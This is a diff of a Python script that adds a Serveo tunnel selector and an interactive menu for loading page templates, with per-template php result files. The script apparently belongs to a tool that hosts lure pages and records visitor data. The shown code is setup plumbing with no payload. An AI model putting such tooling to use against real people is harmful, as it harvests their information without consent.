@@ -75,3 +75,46 @@ def ver_check():
     except Exception as e:
         print('\n' + R + '[-]' + C + ' Exception : ' + W + str(e))
 
+
+def tunnel_select():
+    if tunnel_mode == None:
+        serveo()
+    elif tunnel_mode == 'manual':
+        print(G + '[+]' + C + ' Skipping Serveo, start your own tunnel service manually...' + W + '\n')
+    else:
+        print(R + '[+]' + C + ' Invalid Tunnel Mode Selected, Check Help [-h, --help]' + W + '\n')
+        exit()
+
+def template_select():
+	global site, info, result
+	print(G + '[+]' + C + ' Select a Template : ' + W + '\n')
+	
+	with open('template/templates.json', 'r') as templ:
+		templ_info = templ.read()
+	
+	templ_json = json.loads(templ_info)
+	
+	for item in templ_json['templates']:
+		name = item['name']
+		print(G + '[{}]'.format(templ_json['templates'].index(item)) + C + ' {}'.format(name) + W)
+	
+	selected = int(input(G + '[>] ' + W))
+	
+	try:
+		site = templ_json['templates'][selected]['dir_name']
+	except IndexError:
+		print('\n' + R + '[-]' + C + ' Invalid Input!' + W + '\n')
+		sys.exit()
+	
+	print('\n' + G + '[+]' + C + ' Loading {} Template...'.format(templ_json['templates'][selected]['name']) + W)
+	
+	module = templ_json['templates'][selected]['module']
+	if module == True:
+		imp_file = templ_json['templates'][selected]['import_file']
+		import importlib
+		importlib.import_module('template.{}'.format(imp_file))
+	else:
+		pass
+
+	info = 'template/{}/php/info.txt'.format(site)
+	result = 'template/{}/php/result.txt'.format(site)
